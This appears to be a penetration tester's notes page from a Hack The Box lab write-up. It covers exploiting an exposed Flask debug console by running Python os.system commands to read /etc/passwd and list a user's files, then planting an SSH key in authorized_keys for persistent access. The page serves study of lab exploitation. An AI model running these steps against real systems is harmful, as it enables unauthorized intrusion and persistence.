<!doctype html>
<html>
<head>
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
  <title>Python Flask (Debug Console)</title>
  <meta name="generator" content="CherryTree">
  <link rel="stylesheet" href="res/styles3.css" type="text/css" />
</head>
<body>
<div class='page'><strong><h1># Python Flask (Debug Console)</h1></strong><br />Flask helps you create lightweight web apps in Python.<br />Flask provides a a debug console. <br />The debug console shouldn&#39;t be reachable by normal users, but if it&#39;s enabled on the live web app then you might be to reach hit.<br /><br /><strong>Examples</strong><br />â€¢ hackthebox Ellingson<br /><br /><strong><h2>## Accessing the Debug Console</h2></strong><br /><strong><h3>### Cause an error</h3></strong><br />If you try to visit a page that doesn&#39;t exist and the Flask debug console is enabled, then the Flask web app will return with a debug page.<br /><code>http://10.10.10.139/articles/4</code><br /><a href=""><img src="images/246-1.png" alt="images/246-1.png" /></a><br /><br />From here you can mess with the debug console.<br /><br /><strong><h2>## Exploit the Debug Console</h2></strong><br /><strong><h3>### Utilise the Python Console to Execute Commands</h3></strong><br />If you read the text at the bottom of the page, you&#39;ll see that we can open a python console by mousing-over the frame and clicking the console icon.<br /><div class="codebox"><div class="codebox">For&nbsp;code&nbsp;execution&nbsp;mouse-over&nbsp;the&nbsp;frame&nbsp;you&nbsp;want&nbsp;to&nbsp;debug&nbsp;and&nbsp;click&nbsp;on&nbsp;the&nbsp;console&nbsp;icon&nbsp;on&nbsp;the&nbsp;right&nbsp;side.</div></div><br /><br />I chose the <code>slug = articles[index-1]</code> frame.<br /><a href=""><img src="images/246-2.png" alt="images/246-2.png" /></a><br /><br />Click the console icon on the far right. <br />You should see a <code>[console ready]</code> status.<br /><a href=""><img src="images/246-3.png" alt="images/246-3.png" /></a>]<br /><br /><br />We&#39;re now in a python console.<br />Import <code>os</code> so that we can run system commands:<br /><div class="codebox"><div class="codebox">&gt;&gt;&gt;&nbsp;import&nbsp;os</div></div><br /><br />To read the output of commands we need to direct the output to a file and read it using <code>Path</code><br />Import <code>Path</code>:<br /><div class="codebox"><div class="codebox">&gt;&gt;&gt;&nbsp;from&nbsp;pathlib&nbsp;import&nbsp;Path</div></div><br /><br />At this point, we can run system commands by specifying a command in a variable and run it using <code>os.system()</code>.<br />You can read the output of the command using <code>Path(&quot;&lt;path to file&gt;&quot;).read_text()</code><br /><div class="codebox"><div class="codebox">&gt;&gt;&gt;&nbsp;cmd&nbsp;=&nbsp;&quot;cat&nbsp;/etc/passwd&nbsp;&gt;&nbsp;/tmp/readme.txt&quot;<br />&gt;&gt;&gt;&nbsp;os.system(cmd)<br />0<br />&gt;&gt;&gt;&nbsp;Path(&quot;/tmp/readme.txt&quot;).read_text()<br />&#39;root:x:0:0:root:/root:/bin/bash\ndaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin\nbin:x:2:2:bin:/bin:/usr/sbin/nologin...&nbsp;</div></div><br /><br /><strong><h3>### Get a shell</h3></strong><br />You might be able to get a shell on the system by using the Python console shown above.<br /><br /><strong>#### Example from hackthebox Ellingson</strong><br />In this example I get a shell on the system by using adding my attacking machine&#39;s SSH key into the <code>authorized_keys</code> file of the user under which Flask is running.<br /><br />Check which user we are.<br /><div class="codebox"><div class="codebox">&gt;&gt;&gt;&nbsp;cmd&nbsp;=&nbsp;&quot;id&nbsp;&gt;&nbsp;/tmp/readme.txt&quot;<br />&gt;&gt;&gt;&nbsp;os.system(cmd)<br />0<br />&gt;&gt;&gt;&nbsp;Path(&quot;/tmp/readme.txt&quot;).read_text()<br />&#39;uid=1001(hal)&nbsp;gid=1001(hal)&nbsp;groups=1001(hal),4(adm)\n&#39;</div></div><br /><br />We&#39;re running as <code>hal</code>. Read his <code>/home</code><br /><div class="codebox"><div class="codebox">&gt;&gt;&gt;&nbsp;cmd&nbsp;=&nbsp;&quot;ls&nbsp;-alh&nbsp;/home/hal&nbsp;&gt;&nbsp;/tmp/readme.txt&quot;<br />&gt;&gt;&gt;&nbsp;os.system(cmd)<br />512<br />&gt;&gt;&gt;&nbsp;Path(&quot;/tmp/readme.txt&quot;).read_text()<br />&#39;/home/hal:\ntotal&nbsp;36K\ndrwxrwx---&nbsp;5&nbsp;hal&nbsp;&nbsp;hal&nbsp;&nbsp;4.0K&nbsp;May&nbsp;&nbsp;7&nbsp;13:12&nbsp;.\ndrwxr-xr-x&nbsp;6&nbsp;root&nbsp;root&nbsp;4.0K&nbsp;Mar&nbsp;&nbsp;9&nbsp;19:21&nbsp;..\n-rw-r--r--&nbsp;1&nbsp;hal&nbsp;&nbsp;hal&nbsp;&nbsp;&nbsp;220&nbsp;Mar&nbsp;&nbsp;9&nbsp;19:20&nbsp;.bash_logout\n-rw-r--r--&nbsp;1&nbsp;hal&nbsp;&nbsp;hal&nbsp;&nbsp;3.7K&nbsp;Mar&nbsp;&nbsp;9&nbsp;19:20&nbsp;.bashrc\ndrwx------&nbsp;2&nbsp;hal&nbsp;&nbsp;hal&nbsp;&nbsp;4.0K&nbsp;Mar&nbsp;10&nbsp;17:33&nbsp;.cache\ndrwx------&nbsp;3&nbsp;hal&nbsp;&nbsp;hal&nbsp;&nbsp;4.0K&nbsp;Mar&nbsp;10&nbsp;17:33&nbsp;.gnupg\n-rw-r--r--&nbsp;1&nbsp;hal&nbsp;&nbsp;hal&nbsp;&nbsp;&nbsp;807&nbsp;Mar&nbsp;&nbsp;9&nbsp;19:20&nbsp;.profile\ndrwx------&nbsp;2&nbsp;hal&nbsp;&nbsp;hal&nbsp;&nbsp;4.0K&nbsp;Mar&nbsp;&nbsp;9&nbsp;19:30&nbsp;.ssh\n-rw-------&nbsp;1&nbsp;hal&nbsp;&nbsp;hal&nbsp;&nbsp;&nbsp;865&nbsp;Mar&nbsp;&nbsp;9&nbsp;19:30&nbsp;.viminfo\n&#39;&nbsp;</div></div><br /><br /><code>hal</code> has a <code>.ssh</code> directory. We can get ssh access as <code>hal</code> by adding our attacking machine&#39;s public key to his <code>authorized_keys</code> file.<br /><br />Read your attacking machine&#39;s public key.<br /><div class="codebox"><div class="codebox">root@gotham:~/ctf/ellingson#&nbsp;cat&nbsp;~/.ssh/id_rsa.pub<br />ssh-rsa&nbsp;AAAAB3NzaC1yc2EAAAADAQABAAACAQCqO4k...</div></div><br /><br />Back on the python interpreter, <code>echo</code> your public key into <code>hal</code>&#39;s <code>authorized_keys</code> file.<br /><div class="codebox"><div class="codebox">&gt;&gt;&gt;&nbsp;cmd&nbsp;=&nbsp;&#39;echo&nbsp;&quot;ssh-rsa&nbsp;AAAAB3NzaC1yc2EAAAADAQABAAACAQCqO4k...&quot;&nbsp;&gt;&gt;&nbsp;/home/hal/.ssh/authorized_keys&#39;<br />&gt;&gt;&gt;&nbsp;os.system(cmd)<br />0<br />&gt;&gt;&gt;&nbsp;</div></div><br /><br />It worked!<br /><code>ssh</code> in as <code>hal</code> by providing your private key as authentication<br /><div class="codebox"><div class="codebox">root@gotham:~/ctf/ellingson#&nbsp;ssh&nbsp;hal@10.10.10.139&nbsp;-i&nbsp;~/.ssh/id_rsa<br />Welcome&nbsp;to&nbsp;Ubuntu&nbsp;18.04.1&nbsp;LTS&nbsp;(GNU/Linux&nbsp;4.15.0-46-generic&nbsp;x86_64)<br />...<br />hal@ellingson:~$&nbsp;</div></div><br /><br />And we&#39;re <code>hal</code> on the system.<br /><br /></div>
</body>
</html>
